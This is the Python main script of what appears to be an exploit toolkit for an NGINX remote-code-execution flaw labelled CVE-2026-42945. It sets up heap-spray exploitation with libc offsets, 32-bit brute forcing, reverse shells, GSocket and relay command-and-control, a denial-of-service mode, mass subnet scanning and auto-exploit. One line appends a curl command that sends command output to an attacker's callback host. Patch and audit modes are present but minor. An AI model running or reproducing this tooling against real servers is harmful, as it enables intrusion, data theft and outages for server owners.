#!/usr/bin/env python3
"""
CVE-2026-42945 (NGINX Rift) Super Toolkit — modular entry point.

Modes:
  CLI  — run with --help to see all options
  TUI  — interactive menu (launched when no args given)

Dependencies: stdlib only — no pip packages required.
"""
from __future__ import annotations

import json
import sys
import threading
import time
from pathlib import Path

from config import (
    _KILL_PORT, BANNER,
    DEFAULT_HEAP_BASE, DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET,
    DEFAULT_HEAP_OFFSETS,
    DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
    DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
    DEFAULT_SYSTEM_OFF_32, DEFAULT_SPRAY_INTERNAL_OFF_32, DEFAULT_N_PLUS_32,
    KNOWN_BUILDS, GSRN_HOST, GSRN_PORT, DATA_ADDR_OFFSET,
)
import config as _cfg
from ui.cli import build_parser, _prepare_c2_method, parse_target, parse_int
from ui.output import log, generate_html_scan_report, generate_json_report, print_scan_results
from ui.tui import run_interactive
from core.exploit import (
    mode_check, mode_exploit, _run_callback_listener,
    CallbackState, kill_port, run_shell_listener,
)
from core.payload import (
    build_reverse_shell_cmd, build_l2_payload, show_l2relay_panel,
)
from c2.methods import GSocketCallbackReceiver, start_gsocket_l1_listener, forward_gsocket_shell
from recon.scanner import detect_service, scan_subnet, bulk_fingerprint_check
from recon.nginx_config import detect_waf
from recon.audit import audit_headers, tls_audit
from recon.endpoints import path_discovery
from modes.dos import mode_dos
from modes.probe import mode_probe_cmd, mode_curl_only
from modes.listen import mode_listen_only
from modes.exploit32 import mode_exploit_32
from patch.apply import patch_server
from automation.auto import auto_scan, auto_patch, auto_exploit


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    if len(sys.argv) == 1:
        run_interactive()
        return 0

    if getattr(args, "no_kill_port", False):
        _cfg._KILL_PORT = False

    # Resolve target
    host = args.host
    port = args.port
    vhost = host
    use_ssl = getattr(args, "ssl", False) or (port == 443)
    if args.target:
        parsed = parse_target(args.target)
        if parsed:
            host, port, vhost, use_ssl = parsed

    parsed_offsets = DEFAULT_HEAP_OFFSETS
    if args.offsets:
        parsed_offsets = [parse_int(x.strip()) for x in args.offsets.split(",") if x.strip()]

    heap_base = args.heap_base or DEFAULT_HEAP_BASE
    libc_base = args.libc_base or DEFAULT_LIBC_BASE
    system_off = args.system_offset or DEFAULT_SYSTEM_OFFSET
    spray_path = getattr(args, "spray_path", None)
    data_offset = getattr(args, "data_offset", DATA_ADDR_OFFSET)

    if args.known_build:
        kb = KNOWN_BUILDS[args.known_build]
        heap_base  = kb["heap_base"]
        libc_base  = kb["libc_base"]
        system_off = kb["sys_offset"]
        parsed_offsets = kb["offsets"]
        log(f"Known build '{args.known_build}': heap={hex(heap_base)} "
            f"libc={hex(libc_base)} sys_off={hex(system_off)}", "info")

    # ── CHECK ─────────────────────────────────────────────────────────────────
    if args.check:
        result = mode_check(host, port, vhost=vhost, use_ssl=use_ssl)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            for k, v in result.items():
                print(f"{k}: {v}")
        return 0 if "present" in str(result.get("verdict", "")) else 1

    # ── PROBE (option 11) ─────────────────────────────────────────────────────
    if args.probe:
        result = mode_probe_cmd(
            host, port,
            cb_host=args.probe_host, cb_port=args.probe_port, cb_path=args.probe_path,
            heap_base=heap_base, libc_base=libc_base, system_off=system_off,
            offsets=parsed_offsets, tries=args.tries, vhost=vhost, use_ssl=use_ssl,
            spray_path=spray_path,
        )
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("hit"):
                print(f"[+] BEACON RECEIVED — RCE CONFIRMED!  cb_url={result['cb_url']}")
                print(f"[+] Exploit addr: {result.get('winning_addr')}")
            elif result.get("exploit_success"):
                print(f"[!] Exploit succeeded but no beacon within 15 s.")
            else:
                print(f"[-] Probe failed: {result.get('error') or 'no crash'}")
        return 0 if result.get("hit") else 2

    # ── CURL-ONLY (option 12) ─────────────────────────────────────────────────
    if args.curl_only:
        result = mode_curl_only(
            host, port, args.curl_only,
            heap_base=heap_base, libc_base=libc_base, system_off=system_off,
            offsets=parsed_offsets, tries=args.tries, vhost=vhost, use_ssl=use_ssl,
            spray_path=spray_path,
        )
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("success"):
                print(f"[+] Exploit succeeded — check {args.curl_only} server logs")
            else:
                print(f"[-] Exploit failed: {result.get('error') or 'no crash'}")
        return 0 if result.get("success") else 2

    # ── 32-BIT BRUTE FORCE ────────────────────────────────────────────────────
    if args.bruteforce_32:
        target_raw, cb_ip = args.bruteforce_32
        parsed = parse_target(target_raw)
        if not parsed:
            print("Invalid target for --bruteforce-32. Use host:port.")
            return 1
        bh, bp, bv, bs = parsed
        result = mode_exploit_32(
            bh, bp, args.cmd or "id", cb_ip, args.lport,
            DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
            DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
            DEFAULT_SYSTEM_OFF_32, DEFAULT_SPRAY_INTERNAL_OFF_32, DEFAULT_N_PLUS_32,
            vhost=bv, use_ssl=bs,
        )
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("success"):
                print(f"[+] RCE CONFIRMED!  output={result.get('output')}")
            else:
                print(f"[-] Brute-force exhausted: {result.get('attempts_tried', 0)} tries")
        return 0 if result.get("success") else 2

    # ── EXPLOIT / SHELL / L2RELAY ─────────────────────────────────────────────
    if args.exploit or args.shell or args.l2relay:
        cmd = args.cmd or ""
        if args.l2relay:
            if not args.l2_relay_ip:
                print("--l2relay requires --l2-relay-ip")
                return 1
            cmd = build_l2_payload(args.l2_relay_ip, args.l2_relay_port)
            show_l2relay_panel(args.l2_relay_ip, args.l2_relay_port,
                               args.l1_token, args.l2_secret, cmd)
        elif args.shell:
            cmd = build_reverse_shell_cmd(args.lhost, args.lport)
        if not cmd:
            print("--exploit requires --cmd, --shell, or --l2relay")
            return 1

        c2_result = _prepare_c2_method(args)
        if c2_result and c2_result[0] != "fallback":
            _, payload_processor = c2_result
            if payload_processor:
                cmd = payload_processor(cmd)

        _gs_receiver: GSocketCallbackReceiver | None = None
        _cb_state: CallbackState | None = None

        if not args.shell:
            if args.gsocket:
                _rh, _, _rp = args.gs_relay.partition(":")
                _gs_receiver = GSocketCallbackReceiver(
                    args.gs_secret or None, _rh, int(_rp) if _rp else GSRN_PORT
                )
                log("Connecting to GSRN relay...", "info")
                if _gs_receiver.start():
                    log(f"GSRN ready  secret={_gs_receiver.secret}", "ok")
                    cmd = _gs_receiver.target_cmd(cmd)
                else:
                    log("GSRN connect failed — no output capture", "warn")
                    _gs_receiver = None
            elif args.callback_ip:
                _cb_state = CallbackState()
                _cb_ready = threading.Event()
                threading.Thread(
                    target=_run_callback_listener,
                    args=("0.0.0.0", args.callback_port, _cb_state, _cb_ready),
                    daemon=True,
                ).start()
                _cb_ready.wait(5)
                log(f"HTTP callback listener on :{args.callback_port}", "ok")
                cmd = f"{cmd} | curl -sm5 -d @- http://{args.callback_ip}:{args.callback_port}/rce"

        if args.shell and not args.l2relay:
            threading.Thread(target=run_shell_listener, args=(args.lport,),
                             daemon=True).start()
            time.sleep(0.5)

        result = mode_exploit(
            host, port, cmd,
            heap_base=heap_base, libc_base=libc_base, system_off=system_off,
            offsets=parsed_offsets, tries_per_offset=args.tries, vhost=vhost, use_ssl=use_ssl,
            spray_path=spray_path,
        )

        if result.get("success"):
            if _gs_receiver:
                log("Waiting for GSocket output (30 s)...", "info")
                out = _gs_receiver.wait(30)
                _gs_receiver.stop()
                if out:
                    print(f"--- Output ---\n{out}\n--------------")
            elif _cb_state:
                log("Waiting for HTTP callback (15 s)...", "info")
                if _cb_state.event.wait(15):
                    print(f"--- Output ---\n{_cb_state.output}\n--------------")

        if args.json:
            print(json.dumps({
                "success": result.get("success"),
                "winning_addr": result.get("winning_addr"),
                "command_sent": cmd, "error": result.get("error"),
                "spray_path": result.get("spray_path"),
                "crash_latency_ms": result.get("crash_latency_ms"),
                "crash_cause": result.get("crash_cause"),
            }, indent=2))
        else:
            if result.get("success"):
                cause = result.get("crash_cause", "unknown")
                latency = result.get("crash_latency_ms")
                lat_str = f"  latency={latency}ms" if latency else ""
                print(f"[+] RCE triggered!  addr={result.get('winning_addr')}  cause={cause}{lat_str}")
            else:
                print(f"[-] Exploit failed: {result.get('error') or 'no crash'}")
        return 0 if result.get("success") else 3

    # ── LISTENER ONLY (option 13) ─────────────────────────────────────────────
    if args.listen:
        result = mode_listen_only(
            listen_type=args.listen,
            listen_ip=args.listen_ip,
            listen_port=args.listen_port,
            timeout=args.listen_timeout,
        )
        if args.json:
            print(json.dumps(result, indent=2))
        return 0 if result["captured_count"] > 0 else 1

    # ── DoS ───────────────────────────────────────────────────────────────────
    if args.dos:
        result = mode_dos(host, port, vhost=vhost, use_ssl=use_ssl)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("vulnerable"):
                print("[!] VULNERABLE — worker crashed and recovered")
            else:
                print("[*] No crash detected")
        return 1 if result.get("vulnerable") else 0

    # ── SUBNET SCAN ───────────────────────────────────────────────────────────
    if args.scan_subnet:
        hosts = scan_subnet(args.scan_subnet, port, args.workers)
        results = []
        for h in hosts:
            svc = detect_service(h, port, vhost=h)
            results.append(svc)
        if args.output:
            if args.output.endswith(".json"):
                generate_json_report({"scan_results": results}, args.output)
            else:
                generate_html_scan_report(results, args.output)
        print_scan_results(results)
        return 0

    # ── PATCH ─────────────────────────────────────────────────────────────────
    if args.patch:
        result = patch_server(args.patch, 22, args.user, args.password,
                              args.key_path, args.dry_run)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print(f"[{result['status']}] {args.patch}")
            for step in result.get("steps", []):
                print(f"  {step['step']}: {step['status']} — {step['detail'][:80]}")
        return 0

    # ── AUDIT ─────────────────────────────────────────────────────────────────
    if args.audit:
        parsed = parse_target(args.audit)
        if parsed:
            host, port, vhost, use_ssl = parsed
        hdrs  = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
        paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
        waf   = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
        tls   = tls_audit(host, port, vhost=vhost)
        out   = {"target": f"{host}:{port}", "headers": hdrs, "paths": paths,
                 "waf": waf, "tls": tls}
        if args.json:
            print(json.dumps(out, indent=2))
        else:
            for k, v in hdrs.items():
                if isinstance(v, dict):
                    mark = "OK" if v.get("present") else "--"
                    print(f"  [{mark}] {k}: {(v.get('value') or '')[:40]}")
            if waf:
                print(f"  WAF: {', '.join(waf)}")
        if args.output:
            if args.output.endswith(".json"):
                generate_json_report(out, args.output)
            else:
                generate_html_scan_report([out], args.output)
        return 0

    # ── AUTO MODES ────────────────────────────────────────────────────────────
    if args.auto_scan:
        auto_scan(args.auto_scan, port, output=args.output)
        return 0

    if args.auto_patch:
        auto_patch(args.auto_patch, port, args.user, args.password, args.key_path,
                   args.dry_run)
        return 0

    if args.auto_exploit:
        parsed = parse_target(args.auto_exploit)
        if parsed:
            h, p, v, s = parsed
            result = auto_exploit(h, p, args.cmd or "id",
                                  heap_base, libc_base, system_off, parsed_offsets,
                                  vhost=v, use_ssl=s, spray_path=spray_path)
            if args.output:
                generate_json_report({
                    "target": f"{h}:{p}", "success": result.get("success"),
                    "winning_addr": result.get("winning_addr"),
                }, args.output)
        return 0

    # ── BULK CHECK ────────────────────────────────────────────────────────────
    if args.bulk_check:
        try:
            lines = Path(args.bulk_check).read_text().splitlines()
        except OSError as e:
            print(f"[-] Cannot read file: {e}")
            return 1
        results = bulk_fingerprint_check(lines, workers=args.workers,
                                         output=args.output)
        if args.json:
            print(json.dumps(results, indent=2, default=str))
        else:
            print_scan_results(results)
            vuln_n = sum(1 for r in results if r.get("vulnerable"))
            safe_n = sum(1 for r in results if r.get("vulnerable") is False)
            print(f"\n[summary] total={len(results)}  vuln={vuln_n}  safe={safe_n}")
        return 1 if any(r.get("vulnerable") for r in results) else 0

    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
